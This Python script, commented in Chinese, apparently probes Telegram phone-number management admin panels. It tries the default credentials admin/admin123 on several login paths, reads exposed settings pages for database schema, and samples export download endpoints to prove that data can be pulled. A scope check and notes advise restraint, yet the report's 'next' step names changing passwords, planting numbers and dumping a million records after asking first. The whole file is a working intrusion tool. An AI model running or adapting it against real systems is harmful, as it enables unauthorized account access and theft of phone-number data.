#!/usr/bin/env python3
"""TG 号码管理后台 L1/L2（授权范围内）。

弱口 + settings 只读 + export 只取响应头/前 80 字节。不改密、不植号、不整库拖。
"""
from __future__ import annotations

import argparse
import json
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-tg-number-admin"
CREDS = (("admin", "admin123"),)
LOGIN_PATHS = (
    "/login", "/api/login", "/auth/login", "/user/login",
    "/api/user/login", "/settings/login",
)


def _req(sess: requests.Session, method: str, url: str, **kw) -> requests.Response | None:
    kw.setdefault("timeout", 12)
    kw.setdefault("verify", False)
    try:
        return sess.request(method, url, **kw)
    except Exception:
        return None


def _looks_admin(text: str) -> bool:
    t = text.lower()
    return any(x in text or x in t for x in (
        "TG号码", "tg号码管理", "号码管理",
        "首次部署后请立即修改默认密码",
    ))


def _login_ok(r: requests.Response | None, body: str) -> bool:
    if r is None:
        return False
    if r.status_code in {401, 403}:
        return False
    body = body or (r.text or "")
    loc = (r.headers.get("Location") or "").lower()
    if r.status_code in {301, 302, 303} and any(x in loc for x in ("batch", "setting", "dashboard", "export")):
        return True
    compact = body.replace(" ", "")
    fail = ("密码错误", "失败", "验证码", "参数错误", "用户不存在", "未登录", "错误")
    if any(x in compact for x in ('"code":0', '"code":200', '"ok":true', '"success":true')):
        if any(w in body for w in fail):
            return False
        if any(w in body.lower() for w in ("token", "登录成功", "\"ok\":true", "success")):
            return True
        if r.cookies:
            return True
        return False
    if r.status_code == 200 and ("退出" in body or "logout" in body.lower()) and _looks_admin(body):
        return True
    return False


def run(args: argparse.Namespace) -> dict[str, Any]:
    host = host_of(args.base)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or args.base}", file=sys.stderr)
        sys.exit(2)
    base = args.base.rstrip("/")
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = UA
    findings: list[dict[str, Any]] = []

    home = _req(sess, "GET", base + "/", allow_redirects=True)
    if home is not None and _looks_admin(home.text[:8000]):
        findings.append({"level": "L1", "signal": "title-fingerprint", "path": "/", "status": home.status_code})
        print("  L1 title-fingerprint")
        if "默认密码" in home.text:
            findings.append({"level": "L1", "signal": "default-password-comment", "path": "/"})

    logged = False
    for path in LOGIN_PATHS:
        for user, pw in CREDS:
            for payload in (
                {"username": user, "password": pw},
                {"user": user, "password": pw},
                {"account": user, "password": pw},
            ):
                attempts = (
                    (payload, {"Content-Type": "application/x-www-form-urlencoded"}, "data"),
                    (payload, {"Content-Type": "application/json"}, "json"),
                )
                hit_login = False
                for body_obj, hdrs, mode in attempts:
                    kw = {"headers": hdrs, "allow_redirects": False}
                    kw["data" if mode == "data" else "json"] = body_obj
                    r = _req(sess, "POST", urljoin(base + "/", path.lstrip("/")), **kw)
                    body = r.text[:2000] if r is not None else ""
                    if _login_ok(r, body):
                        logged = True
                        hit_login = True
                        findings.append({
                            "level": "L2", "signal": "weak-login", "path": path,
                            "user": user, "status": r.status_code if r else None,
                        })
                        print(f"  L2 weak-login {path} {user}")
                        break
                if hit_login:
                    break
            if logged:
                break
        if logged:
            break

    r = _req(sess, "GET", urljoin(base + "/", "settings/"), allow_redirects=True)
    if r is not None and r.status_code == 200:
        blob = r.text[:6000]
        schema = any(k in blob for k in ("phone_numbers", "export_items", "tabDB", "SQLite"))
        if schema or (logged and "用户管理" in blob):
            findings.append({
                "level": "L2", "signal": "settings-schema-leak", "path": "/settings/",
                "note": "表/用户管理面可读；不要 change_password",
            })
            print("  L2 settings-schema-leak")

    for i in ("1", "0"):
        r = _req(
            sess, "GET", urljoin(base + "/", f"export/download/{i}"),
            allow_redirects=False, stream=True,
        )
        if r is None:
            continue
        if r.status_code in {401, 403, 404}:
            try:
                r.close()
            except Exception:
                pass
            continue
        ctype = (r.headers.get("Content-Type") or "").lower()
        disp = (r.headers.get("Content-Disposition") or "").lower()
        try:
            sample = next(r.iter_content(80), b"")
        except Exception:
            sample = b""
        try:
            r.close()
        except Exception:
            pass
        looks_file = (
            "attachment" in disp or "octet" in ctype or "csv" in ctype
            or ("text/plain" in ctype and sample[:1] not in (b"<", b"{"))
        )
        if r.status_code == 200 and not looks_file:
            continue
        if looks_file or (r.status_code == 200 and sample[:1] not in (b"<", b"{")):
            findings.append({
                "level": "L2", "signal": "export-download",
                "path": f"/export/download/{i}",
                "status": r.status_code,
                "content_type": ctype[:80],
                "head_hex": sample[:40].hex(),
                "note": "只留头部证明；禁止循环 id 拖全库",
            })
            print(f"  L2 export-download /{i}")
            break

    report = {
        "target": args.base,
        "ts": datetime.now(UTC).isoformat(),
        "findings": findings,
        "playbook": "传承/飞鸽·号册主府.md",
        "next": "登录或导出面成立就填对象矩阵；改原密/植号/百万拖号先问",
    }
    out = write_probe_json(
        report, case=args.case, out=args.out,
        case_subdir="tg_number_admin", filename="surface.json",
    )
    print(json.dumps(report, ensure_ascii=False, indent=2))
    print(f"[+] wrote {out}", file=sys.stderr)
    return report


def cmd_doctor() -> int:
    src = Path(__file__).read_text(encoding="utf-8")
    checks = [
        "in_scope" in src,
        "change_password" not in src or "不要 change_password" in src,
        "admin123" in src,
        "[:80]" in src or "iter_content" in src,
        "stream=True" in src,
        (OPS.parent.parent / "传承/飞鸽·号册主府.md").is_file(),
        (OPS.parent.parent / "杀招/太白云生·号册主府/SKILL.md").is_file(),
    ]
    print(f"doctor {sum(checks)}/{len(checks)}")
    return 0 if all(checks) else 1


def main() -> int:
    ap = argparse.ArgumentParser(description="TG 号码管理后台探针")
    ap.add_argument("--base", "-u", default="")
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--doctor", action="store_true")
    args = ap.parse_args()
    if args.doctor:
        return cmd_doctor()
    if not args.base:
        ap.error("需要 --base")
    run(args)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
